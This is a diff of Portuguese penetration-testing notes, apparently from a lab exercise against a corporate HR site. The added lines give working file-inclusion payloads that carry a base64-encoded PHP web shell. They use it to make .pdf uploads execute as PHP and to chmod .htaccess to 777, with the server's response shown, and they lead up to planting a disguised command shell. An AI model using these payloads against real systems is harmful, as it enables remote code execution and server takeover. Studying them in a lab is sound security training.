@@ -66,7 +66,15 @@ comando que envia pdf malicioso pro site
 ```
   http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=echo%20%27AddType%20application%2Fx-httpd-php%20.pdf%27%20>%20%2Fvar%2Fwww%2Fhtml%2Fuploads%2F.htaccess
 ```
-- agora uptar o prompt de comando pro servidor e testar se funciona
+
+- melhorar previlegios do arquivo .htaccess
+```
+http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=chmod%20777%20/var/www/html/uploads/.htaccess
+
+  RESPOSTA: -rwxrwxrwx  1 www-data www-data    37 Sep 19 08:57 .htaccess
+```
+
+- agora upar o prompt de comando pro servidor e testar se funciona
 
 comando que envia o prompt de comando .pdf pro site : 
 
